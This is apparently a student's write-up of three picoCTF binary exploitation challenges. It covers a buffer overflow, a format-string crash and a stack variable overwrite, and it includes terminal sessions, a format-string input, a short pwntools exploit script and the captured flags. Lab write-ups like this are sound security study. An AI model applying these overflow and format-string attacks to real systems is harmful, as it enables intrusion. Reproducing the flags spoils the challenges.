# 1. buffer overflow 0
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.

## Solution:
- once i connected to the server using nc and typed out a random input the file exited for each and every input so then i moved on and opened the source code. 
- the name of the file was vuln which potentially stands fro vlunerable dn saw a function called sigsev which i searched up and figured out that it stands for segmentation fault(more in notes)
- so in the main fucntion the program runs and a segmentation handler is set up which ideally should crash the program in case such event occurs but it was set up as flag being printed if the event occurs so we move down and see that there is a buffer1 created which takes in a 100 character input and a vuln function is called which takes the input and copies it to a character buffer2 but it has been assigned only memeory for 16 characters to potentitally giving an input of more than 16 characters calls the sigsev function and hence th flag was printed on the terminal

```
dhiraj@DESKTOP-361HESD:~$ nc saturn.picoctf.net 62991
Input: 12345
The program will exit now
w
dhiraj@DESKTOP-361HESD:~$ nc saturn.picoctf.net 62991
Input: sdfsdfvmfhidkfmvnbfdhsjaksdcndhsjakl
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
## Concepts learnt:
- SIGSEGV (signal segmentation violation) is an error signal. the error appears when a program or code tries to access an invalid memory location and eventually sends a signal which causes the program to crash.
- in binary exploitation strcpy and gets are not safe to use. The manual pages for the functions (man 3 strcpy and man 3 gets) have warnings advising against using them.
- Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and gets() will continue to store characters past the end of the buffer.
## Resources:
- [about sigsegv](https://phoenixnap.com/kb/sigsegv)

***


# 2. format string 0
Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.

## Solution:
- like the previous challenge the goal was to trigger he segmentation fault since it has been set to print the flag in such case.
- so now when i using netcat and connected to the server it printed out a menu for me to choose out of three options and since the name of the challenge is format strings and we learnt about that in our pps classes the grilled cheese burger had a %114 embedded in it while when we selected the other two options the server just printed is more hungry and ended the program so like we gussed selecting grilled cheese took us to the next step of the program. the program only goes to the next step if and only if count of the slected choice is twice of the size of buffer and since size of buffer is 32 the system makes sure the size is greater than 64 bytes
- now count variable is equal to number of printed characters and it was expecting 114 characters and since there was no number it print in space or null and then called the serve bob function
- in this function the classical cheesesteak consisted of an embedded %s format string and when printf processes it without any argument it accesses the memory randomly and this triggers the segmenatation error and prints the flag

```
dhiraj@DESKTOP-361HESD:/mnt/c/Users/user/downloads$ nc mimas.picoctf.net 52882
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```
## Concepts learnt:
- SIGSEGV (signal segmentation violation) is an error signal. the error appears when a program or code tries to access an invalid memory location and eventually sends a signal which causes the program to crash.
- format specifiers are very important in c and should be dealt carefully with respect to writing code and one of the most important ascpects is to read the source code properly and understand where the loopholes exist so that we can exploit them and obtain flags

## Resources:
- [about sigsegv](https://phoenixnap.com/kb/sigsegv)
- [format strings in c](https://www.w3schools.com/c/c_variables_format.php)

***


# 3. clutter overflow
- we should find a possible vulnerability in the script and obtain the flag

## Solution:
- so one of the main vulnerabilities in this file is the gets commands which takes the input of the clutter and even in the manual of gets the biggest bug is that it takes more input than the required or designed size and can lead to overflow so first i try out by typing random characters and the code always prints out 0 as initiated.
- so to understand this more i tried exploring stack as it was one aspect (more in concepts) where the variables are stored so first code is initiated so the bottom part goes to code of 8 bytes followed by the character array clutter which holds 256 bytes and when we input more than 256 bytes like seen in the terminal prompt below the code value is the value of characters of ascii converted to hexa decimal in the reverse order so now our goal is to use this and make the value of code equal to deadbeef.
- so now at first i typed out 256 a's and saw that the python code value returned 0 and the same happend for 264 characters as a well so then after some searching i searched up learn about some form of cover which is of 8 bytes and when i typed 264 a's and random characters and observed that the ascii value of the characters was converted to hex and printed in the reverse order but for us to make code equal to deadbeaf.
- i spent researching about pwn tools and understood they are tools that are used in ctfs so then i prepared a script using resources where i read the message printed by the server and then sent an input which consists of 264 a's and then deadbeef encoded in the raw byte form which eventually prints the flag

```
My room is so cluttered...
What do you see?
123456
code == 0x0
code != 0xdeadbeef :(

My room is so cluttered...
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaqwert
code == 0x7472657771
code != 0xdeadbeef :(

from pwn import *

nc_connection = remote('mars.picoctf.net', 31890)

limit = b'A' * 264
value_code = p64(0xdeadbeef)
final_input = limit + value_code

log.info("Receiving information")
nc_connection.recvuntil(b'What do you see?')

log.info("Sending the input")
nc_connection.sendline(final_input)

log.success("output sent.")
nc_connection.interactive()

```

## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Concepts learnt:
- read the manual and gets and fgets and we can see that fgets reads one characters less than the value set because fgets gets terminated by the /0 byte is stored in the last character of the buffer
- each byte is represeted by two hex characters and the system reads files the other way around and the slash tells the terminal to read them as actual characters, as raw binary data and not as ascii values
- i learnt a lot about pwn tools and how each individual command is helpful for communication with the server and many individual commands listen in the docs below.

## Resources:
- [stack organisation](https://www.geeksforgeeks.org/computer-organization-architecture/memory-stack-organization-in-computer-architecture/)(https://www.geeksforgeeks.org/compiler-design/storage-allocation-strategies-in-compiler-design/)
-[about pwn tools](https://docs.pwntools.com/en/stable/about.html)(https://github.com/Gallopsled/pwntools)

***